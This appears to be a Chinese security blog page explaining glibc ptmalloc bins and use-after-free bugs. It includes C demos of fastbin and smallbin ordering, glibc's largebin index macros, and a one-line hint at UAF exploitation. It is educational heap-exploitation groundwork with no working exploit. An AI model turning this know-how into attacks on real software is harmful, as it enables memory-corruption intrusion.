<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Pwn进你的心">
<meta property="og:url" content="http://example.com/page/25/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="yhellow">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/25/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/16/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9AUAF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/16/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9AUAF/" class="post-title-link" itemprop="url">Ptmalloc算法：UAF</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-01-16 15:51:12" itemprop="dateCreated datePublished" datetime="2022-01-16T15:51:12+08:00">2022-01-16</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-03-18 00:12:50" itemprop="dateModified" datetime="2022-03-18T00:12:50+08:00">2022-03-18</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/SourceCodeAnalysis/" itemprop="url" rel="index"><span itemprop="name">SourceCodeAnalysis</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>6.7k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>6 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="Ptmalloc算法：UAF"><a href="#Ptmalloc算法：UAF" class="headerlink" title="Ptmalloc算法：UAF"></a>Ptmalloc算法：UAF</h2><p>堆利用中较为常见的漏洞，利用了“free”函数本身的缺陷，对已经置空的指针进行操作</p>
<p>UAF一般有以下几种情况：</p>
<ul>
<li>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃</li>
<li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong></li>
<li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong></li>
</ul>
<p>UAF漏洞主要是后两种，被置空的指针被称为<strong>“dangling pointer”</strong></p>
<hr>
<h2 id="数据结构bins"><a href="#数据结构bins" class="headerlink" title="数据结构bins"></a>数据结构bins</h2><p>简单来说bin就是<strong>free chunk的容器</strong></p>
<p><strong>ptmalloc</strong> 把大小相似的 chunk，用双向链表连接起来，这样就形成了一个 bin，ptmalloc 一共维护了 128 个这样的 bin，并使用数组来存储这些 bin 如下：（32位）</p>
<img src="/2022/01/16/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9AUAF/1638959281581-1639312548300-1642849652608-1647533569928.png" class title="1638959281581-1639312548300">
<p>从第2个到第64个bin是small bin，small bin中的chunk<strong>大小相同</strong>，small bin是一个双向链表</p>
<p>在某一条bin中(chunk大小相同)按照<strong>「先入先出」</strong>（FIFO 的规则）进行排序，也就是说，刚被释放的放在前面</p>
<p>bins分类：fast bin，small bin，unsorted bin，large bin</p>
<img src="/2022/01/16/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9AUAF/1641885199475-1642849652609-1647533569929.png" class width="1641885199475"> 
<p>bin链都是由当前线程的arena管理的</p>
<p><strong>Fast bin</strong></p>
<p>Fast bin可以看着是 small bins 的一小部分 cache ，设计初衷就是进行快速的小内存分配和释放</p>
<p>概念：chunk 的大小在32字节~128字节（0x20~0x80）的 chunk 称为“fast chunk”（大小不是 malloc 时的大小，而是在内存中 struct malloc_chunk 的大小，包含前2个成员） </p>
<p>特征：</p>
<ul>
<li>Fast bin是 <strong>单向链表</strong> 只有 FD 指针</li>
<li>Fast chunk 不会对其他 free chunk 进行合并</li>
<li>系统将属于 Fast bin 的 chunk 的 PREV_INUSE 位总是设置为1 </li>
<li>Fast bin 中无论是添加还是移除 fast chunk，都是对“链表头”进行操作，而不会对某个中间的 fast chunk 进行操作</li>
</ul>
<p>使用次序：后入先出（可以类比一下栈）</p>
<ul>
<li>释放时：将此 chunk 插入到该 Fast bin 的“链表头”</li>
<li>申请时：优先申请 Fast bin “链表头”处的 chunk（从前向后申请）</li>
</ul>
<p>通常情况下：</p>
<ul>
<li>如果chunk大小 小于“0x40(32位) / 0x80(64位)”，那么该chunk会直接存入Fast bin</li>
<li>如果内存请求 小于“0x40(32位) / 0x80(64位)”，那么程序会优先在 Fast bin 中查找</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> *p1,*p2,*p3,*p4,*p5,*p6;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> *a,*b,*c;</span><br><span class="line">	</span><br><span class="line">	p1=<span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,p1<span class="number">-4</span>);</span><br><span class="line">	p2=<span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,p2<span class="number">-4</span>);</span><br><span class="line">	p3=<span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,p3<span class="number">-4</span>);</span><br><span class="line">	p4=<span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,p4<span class="number">-4</span>);</span><br><span class="line">	p5=<span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,p5<span class="number">-4</span>);</span><br><span class="line">	p6=<span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,p6<span class="number">-4</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">free</span>(p1); <span class="comment">// 直接插入表头</span></span><br><span class="line">	<span class="built_in">free</span>(p3);</span><br><span class="line">	<span class="built_in">free</span>(p5);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;--------------\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;fastbin:%p -&gt; %p -&gt; %p\n&quot;</span>,p5<span class="number">-4</span>,p3<span class="number">-4</span>,p1<span class="number">-4</span>);</span><br><span class="line"></span><br><span class="line">	a=<span class="built_in">malloc</span>(<span class="number">0x50</span>); <span class="comment">// 从表头开始申请</span></span><br><span class="line">	b=<span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">	c=<span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;--------------\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,a<span class="number">-4</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,b<span class="number">-4</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,c<span class="number">-4</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;--------------\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/桌面] ./test </span><br><span class="line"><span class="number">0x56000683a000</span></span><br><span class="line"><span class="number">0x56000683a470</span></span><br><span class="line"><span class="number">0x56000683a4d0</span></span><br><span class="line"><span class="number">0x56000683a530</span></span><br><span class="line"><span class="number">0x56000683a590</span></span><br><span class="line"><span class="number">0x56000683a5f0</span></span><br><span class="line">--------------</span><br><span class="line">fastbin:<span class="number">0x56000683a590</span> -&gt; <span class="number">0x56000683a4d0</span> -&gt; <span class="number">0x56000683a000</span></span><br><span class="line">--------------</span><br><span class="line"><span class="number">0x56000683a590</span></span><br><span class="line"><span class="number">0x56000683a4d0</span></span><br><span class="line"><span class="number">0x56000683a000</span></span><br><span class="line">--------------</span><br></pre></td></tr></table></figure>
<p><strong>Small bin</strong></p>
<p>small bins 中一共有 62 个循环双向链表，每个链表中存储的 chunk 大小都一致</p>
<p>使用次序：先入先出（可以类比一下食堂排队）</p>
<ul>
<li>释放时：将此 chunk 插入到该 Small bin 的“链表头”</li>
<li>申请时：优先申请 Small bin “链表尾”处的 chunk（从后向前申请）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> *p1,*p2,*p3,*p4;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> a,b,c;</span><br><span class="line">	</span><br><span class="line">	p1=<span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">	p2=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">free</span>(p1);</span><br><span class="line">	p3=<span class="built_in">malloc</span>(<span class="number">0x40</span>); <span class="comment">// 直接插入表头</span></span><br><span class="line">	p4=<span class="built_in">malloc</span>(<span class="number">0x100</span>); <span class="comment">// 重新分配:把unsortedbin中的chunk转移到smallbin&amp;largebin中</span></span><br><span class="line">	a=p3+<span class="number">0x10</span>; </span><br><span class="line">	</span><br><span class="line">	p1=<span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">	p2=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">free</span>(p1);</span><br><span class="line">	p3=<span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">	p4=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	p1=<span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">	b=p3+<span class="number">0x10</span>;</span><br><span class="line">	</span><br><span class="line">	p2=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">free</span>(p1);</span><br><span class="line">	p3=<span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">	p4=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	c=p3+<span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;smallbin:0x5555%x -&gt; 0x5555%x -&gt; 0x5555%x\n&quot;</span>,c,b,a);</span><br><span class="line">	p1=<span class="built_in">malloc</span>(<span class="number">0x30</span>); <span class="comment">// 从表尾开始，向前申请</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;chunk1:%p\n&quot;</span>,p1<span class="number">-4</span>);</span><br><span class="line">	p2=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;chunk2:%p\n&quot;</span>,p2<span class="number">-4</span>);</span><br><span class="line">	p3=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;chunk3:%p\n&quot;</span>,p3<span class="number">-4</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/桌面] ./test               </span><br><span class="line">smallbin:<span class="number">0x5555a66515b0</span> -&gt; <span class="number">0x5555a6651300</span> -&gt; <span class="number">0x5555a6651050</span></span><br><span class="line">chunk1:<span class="number">0x5580a6651050</span></span><br><span class="line">chunk2:<span class="number">0x5580a6651300</span></span><br><span class="line">chunk3:<span class="number">0x5580a66515b0</span></span><br></pre></td></tr></table></figure>
<p><strong>Large bin</strong></p>
<p>large bins 中一共包括 63 个 bin，每个 bin 中的 chunk 的大小不一致，而是处于一定区间范围内 </p>
<ul>
<li>概念：大于等于1024字节（0x400）的chunk称之为large chunk，large bin就是用于管理这些largechunk的</li>
<li>large bin链表的个数为63个，被分为6组</li>
<li>largechunk使用 fd_nextsize、bk_nextsize 连接起来的<ul>
<li>fd_nextsize：指向前一个与当前chunk大小不同的第一个空闲块，不包含 bin 的头指针</li>
<li>bk_nextsize：指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针 </li>
</ul>
</li>
<li>合并操作：类似于small bin</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">#<span class="function">define <span class="title">largebin_index_32</span><span class="params">(sz)</span>                                                  \</span></span><br><span class="line"><span class="function">    <span class="params">(((((unsigned <span class="keyword">long</span>)</span> <span class="params">(sz)</span>) &gt;&gt; 6) &lt;</span>= <span class="number">38</span>)                                     \</span><br><span class="line">         ? <span class="number">56</span> + (((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>)                                  \</span><br><span class="line">         : ((((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>)                               \</span><br><span class="line">               ? <span class="number">91</span> + (((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>)                            \</span><br><span class="line">               : ((((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>)                        \</span><br><span class="line">                     ? <span class="number">110</span> + (((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>)                    \</span><br><span class="line">                     : ((((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>)                   \</span><br><span class="line">                           ? <span class="number">119</span> + (((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>)              \</span><br><span class="line">                           : ((((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>)             \</span><br><span class="line">                                 ? <span class="number">124</span> + (((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>)        \</span><br><span class="line">                                 : <span class="number">126</span>)</span><br><span class="line"></span><br><span class="line">#<span class="function">define <span class="title">largebin_index_32_big</span><span class="params">(sz)</span>                                              \</span></span><br><span class="line"><span class="function">    <span class="params">(((((unsigned <span class="keyword">long</span>)</span> <span class="params">(sz)</span>) &gt;&gt; 6) &lt;</span>= <span class="number">45</span>)                                     \</span><br><span class="line">         ? <span class="number">49</span> + (((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>)                                  \</span><br><span class="line">         : ((((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>)                               \</span><br><span class="line">               ? <span class="number">91</span> + (((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>)                            \</span><br><span class="line">               : ((((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>)                        \</span><br><span class="line">                     ? <span class="number">110</span> + (((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>)                    \</span><br><span class="line">                     : ((((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>)                   \</span><br><span class="line">                           ? <span class="number">119</span> + (((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>)              \</span><br><span class="line">                           : ((((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>)             \</span><br><span class="line">                                 ? <span class="number">124</span> + (((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>)        \</span><br><span class="line">                                 : <span class="number">126</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// XXX It remains to be seen whether it is good to keep the widths of</span></span><br><span class="line"><span class="comment">// XXX the buckets the same or whether it should be scaled by a factor</span></span><br><span class="line"><span class="comment">// XXX of two as well.</span></span><br><span class="line">#<span class="function">define <span class="title">largebin_index_64</span><span class="params">(sz)</span>                                                  \</span></span><br><span class="line"><span class="function">    <span class="params">(((((unsigned <span class="keyword">long</span>)</span> <span class="params">(sz)</span>) &gt;&gt; 6) &lt;</span>= <span class="number">48</span>)                                     \</span><br><span class="line">         ? <span class="number">48</span> + (((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>)                                  \</span><br><span class="line">         : ((((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>)                               \</span><br><span class="line">               ? <span class="number">91</span> + (((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>)                            \</span><br><span class="line">               : ((((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>)                        \</span><br><span class="line">                     ? <span class="number">110</span> + (((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>)                    \</span><br><span class="line">                     : ((((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>)                   \</span><br><span class="line">                           ? <span class="number">119</span> + (((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>)              \</span><br><span class="line">                           : ((((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>)             \</span><br><span class="line">                                 ? <span class="number">124</span> + (((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>)        \</span><br><span class="line">                                 : <span class="number">126</span>)</span><br><span class="line"></span><br><span class="line">#<span class="function">define <span class="title">largebin_index</span><span class="params">(sz)</span>                                                     \</span></span><br><span class="line"><span class="function">    <span class="params">(SIZE_SZ == <span class="number">8</span> ? largebin_index_64(sz)</span> : MALLOC_ALIGNMENT </span>== <span class="number">16</span>             \</span><br><span class="line">                                                ? largebin_index_32_big(sz)    \</span><br><span class="line">                                                : largebin_index_32(sz))</span><br></pre></td></tr></table></figure>
<p><strong>Unsorted bin</strong></p>
<p><strong>没有来得及</strong>被其他bin收入的chunk，就会被认为在unsorted bin中</p>
<p>在使用malloc申请内存时，如果在“fastbin”和“smallbin”中都没有找到合适的free chunk，程序就会在unsorted bin中进行遍历，寻找合适的free chunk，不合适的chunk会被 <strong>排序</strong> 并 <strong>重新分配</strong> 到对应的“bins”中</p>
<h2 id="关于bins的内存分配"><a href="#关于bins的内存分配" class="headerlink" title="关于bins的内存分配"></a>关于bins的内存分配</h2><p>用户释放掉的 chunk 不会马上归还给系统，ptmalloc 会统一管理 heap 和 mmap 映射区域中的空闲的 chunk，当用户再一次请求分配内存时，ptmalloc 分配器会试图在空闲的 chunk 中挑选一块合适的给用户，这样可以避免频繁的系统调用，降低内存分配的开销</p>
<p>详细过程：</p>
<ul>
<li><p>malloc的时候，不论malloc的大小，ptmalloc首先会去检查每个bins链（除去fastbins链）是否有与malloc相等大小的freechunk，如果没有就去检查bins链中是否有 <strong>大的freechunk</strong> 可以切割</p>
</li>
<li><p>如果存在，那么就切割大的freechunk，那么切割之后 <strong>剩余 </strong>的chunk成为 <strong>last remainder chunk</strong> ，并且last remainder chunk会被放入到 <strong>unsorted bin</strong> 中</p>
</li>
<li><p>如果没有 <strong>大的free chunk</strong> 可以切割，程序就会查询 <strong>top chunk</strong> ，如果top chunk的大小比用户请求的大小要大的话，就将该top chunk分作两部分：1.用户请求的chunk，2.新的top chunk，否则，就需要扩展heap或分配新的heap了——在 <strong>main arena</strong> 中通过 <strong>sbrk</strong> 扩展heap，而在 <strong>thread arena</strong> 中通过 <strong>mmap</strong> 分配新的heap</p>
</li>
</ul>
<p>流程图：</p>
<img src="/2022/01/16/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9AUAF/1638952496892-1642849652609-1647533569929.png" class width="1638952496892"> 
<h2 id="UAF的利用姿势"><a href="#UAF的利用姿势" class="headerlink" title="UAF的利用姿势"></a>UAF的利用姿势</h2><p>UAF的利用比较简单，重点看下程序的“free模块”，看下哪些指针没有被置空</p>
